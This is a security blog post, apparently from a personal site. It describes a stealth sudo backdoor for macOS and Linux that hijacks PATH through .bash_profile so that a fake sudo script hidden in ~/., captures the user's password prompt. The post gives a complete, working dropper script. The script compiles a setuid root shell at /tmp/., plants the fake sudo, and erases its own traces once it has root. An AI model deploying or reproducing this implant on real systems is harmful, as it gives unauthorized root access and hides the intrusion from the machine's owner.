<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
        <link rel="stylesheet" type="text/css" href="/css/style.css" />
        <link rel="alternate" type="application/rss+xml" title="m4.rkw.io blog" href="http://m4.rkw.io/blog/rss" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <script src='https://www.google.com/recaptcha/api.js'></script>
        <script src="/js/site.js"></script>
        <title>Mark Wadham</title>
    </head>
    <body>
        <div id="menu">
                        <h3>Mark Wadham</h3>
            <ul>
                <li><a href="/">profile</a></li>
                <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
                <li><a href="/cves.html">CVEs</a></li>
                <li><a href="/jsdemos.html">js demos</a></li>
                <li><a href="/contact.html">contact</a></li>
                <li class="space small">twitter: <a href="https://twitter.com/m4rkw">m4rkw</a></li>
                <li class="small">github: <a href="https://github.com/m4rkw">m4rkw</a></li>
                <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
                <li class="red space small"></li>
            </ul>
        </div>
        <div id="content">
            <div id="main-content">
                            
                            <div class="post">
                <h2><a href="/blog/getting-root-without-an-exploit--stealth-sudo-backdoor.html">Getting root without an exploit - stealth sudo backdoor</a></h2>
                <h3>19 Oct 2017 21:59  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a> | <a class="tag" href="/blog/tag/exploits.html">exploits</a></h3>
                
                  <pre>I&#x27;ve published several root privilege escalation bugs this year in various Mac
applications. I decided to see how difficult it would be to escalate privileges
on a machine without actually using an exploit. Having access to a local
account with sudo rights gives us an enormous attack surface for escalation.

Many of the dotfiles, which are nearly always user-writable for obvious reasons,
can be manipulated to divert the user&#x27;s path and replace system utilities like
sudo.

This is a demo of how easy it is to drop a sudo backdoor into a user&#x27;s home
directory with as little chance of them noticing as possible. We have a dropper
bash script that installs the implant. The implant creates the following
directory in the user&#x27;s home:

~/.,

and in here we put a script named &quot;sudo&quot; which is our backdoor. Then we append
two lines to the user&#x27;s .bash_profile like this:

PATH=~/.,:$PATH #374686348234823
set +h #374686348234823

This is to redirect the PATH environment variable to look in our new ,.
directory first to find sudo. We call &quot;set +h&quot; to disable hashing, otherwise if
the user executed our script, after it deletes itself they would get a &quot;No such
file or directory&quot; error the next time they tried to use sudo and would know
something&#x27;s up.

The long commented numbers at the end of the lines allow us to reliably remove
them from the file later in our cleanup process without affecting any other
similar lines.

We also drop a backdoor shell binary into /tmp/., which elevates to root and
spawns a bash shell. We could compile this later - eg at the point of our
backdoor script being executed so it&#x27;s not hanging around in the /tmp/
directory, but this would introduce a slightly noticeable delay when the user
runs sudo and generally most users have so much junk in their /tmp/ directory
that they&#x27;re unlikely to notice it.

Now we wait for the user to open a new ssh connection (to load the new
.bash_profile). The next time they execute sudo, the backdoor script is executed
and first checks to see if it&#x27;s root, if not then it appends itself in the chain
of sudo arguments and re-executes itself, so if the user executed:

$ sudo ls -la 

this would invoke the backdoor script, and *it* would then invoke:

$ /usr/bin/sudo ~/.,/sudo ls -la 

The user would then see a normal sudo password prompt and not suspect anything.
They authenticate, and this returns execution back to the start of our backdoor
script which is now running as root. This time it determines that it is running
as root, so it chown&#x27;s the /tmp/., shell binary to root and sets it mode 4755.
It then removes the ~/., directory and the appended lines from the user&#x27;s
.bash_profile to hide the fact that sudo was ever remapped. Because the user&#x27;s
shell was launched with &quot;set +h&quot; in the .bash_profile, subsequent calls to sudo
will go straight to /usr/bin/sudo without causing any &quot;No such file&quot; errors
looking for the cached path.

The cool part of this is that we don&#x27;t have to wait for the user to exit their
sudo bash session before our backdoor binary is chmod&#x27;d.

And now we&#x27;ve got a setuid binary we can simply execute to pop a root shell:

$ /tmp/.,
# uid=0(root) gid=0(root) groups=0(root)
#

<a href="https://m4.rkw.io/sudo_implant.sh.txt">https://m4.rkw.io/sudo_implant.sh.txt</a>
115139276c0243f7314b87cd2c60e8344aa29ce56aad6f117a251737bb435baf
---------------------------------------------------------------------------
#!/bin/bash

####################################################
###### self-deleting sudo implant backdoor    ######
###### by m4rkw - <a href="https://m4.rkw.io/blog.html">https://m4.rkw.io/blog.html</a> ######
####################################################

unique_number=&quot;374686348234823&quot;
platform=&quot;`uname`&quot;

if [ &quot;$USER&quot; == &quot;root&quot; ] ; then
  echo &quot;er, lay off the weed. you&#x27;re already root.&quot;
  exit 1
fi

cat &gt; /tmp/exp.c &lt;&lt;EOF
#include &lt;unistd.h&gt;
int main()
{
  setuid(0);
  seteuid(0);
  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,NULL);
  return 0;
}
EOF
gcc -o /tmp/., /tmp/exp.c
if [ $? -ne 0 ] ; then
  echo &quot;failed to compile the exploit, gcc isn&#x27;t working.&quot;
  rm -f /tmp/exp.c
  exit 1
fi
rm -f /tmp/exp.c

mkdir ~/., 2&gt;/dev/null
cat &gt; ~/.,/sudo &lt;&lt;EOF
#!/bin/bash
args=(&quot;\$@&quot;)
if [ &quot;\`whoami\`&quot; == &quot;root&quot; ] ; then
  if [ &quot;$platform&quot; == &quot;Darwin&quot; ] ; then
    /usr/bin/sudo chown root:wheel /tmp/.,
  else
    /usr/bin/sudo chown root:root /tmp/.,
  fi
  /usr/bin/sudo chmod 4755 /tmp/.,
  if [ &quot;$platform&quot; == &quot;Darwin&quot; ] ; then
    rm -rf /Users/$USER/.,
    sed -i &#x27;&#x27; &#x27;/^PATH=~\/\.,:\$PATH #$unique_number\$/d&#x27; /Users/$USER/.bash_profile
    sed -i &#x27;&#x27; &#x27;/^set +h #$unique_number\$/d&#x27; /Users/$USER/.bash_profile
  else
    rm -rf /home/$USER/.,
    sed -i &#x27;/^PATH=~\/\.,:\$PATH #$unique_number\$/d&#x27; /home/$USER/.bash_profile
    sed -i &#x27;/^set +h #$unique_number\$/d&#x27; /home/$USER/.bash_profile
  fi
  /usr/bin/sudo &quot;\${args[@]}&quot;
else
  /usr/bin/sudo ~/.,/sudo &quot;\${args[@]}&quot;
fi
EOF

chmod 755 ~/.,/sudo
echo &quot;PATH=~/.,:\$PATH #$unique_number&quot; &gt;&gt; ~/.bash_profile
echo &quot;set +h #$unique_number&quot; &gt;&gt; ~/.bash_profile

echo &quot;implant installed.&quot;
</pre>
                
            </div>
            
            </div>
            <div id="right-content">
                
            <ul>
              <li>&nbsp;&nbsp;<a href="/blog.html">all posts</a>
            </ul>

            <ul>
              <li>&nbsp;&nbsp;[year]</li>
              
                <li>&nbsp;&nbsp;<a href="/blog/2022.html">2022</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/2021.html">2021</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
              
            </ul>

            <ul>
              <li>&nbsp;&nbsp;[tag]</li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/email.html">email</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
              
                <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
              
            </ul>
            </div>
        </div>
				<script>
						(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
						(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
						m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
						})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

						ga('create', 'UA-91604161-1', 'auto');
						ga('send', 'pageview');
				</script>
    </body>
</html>
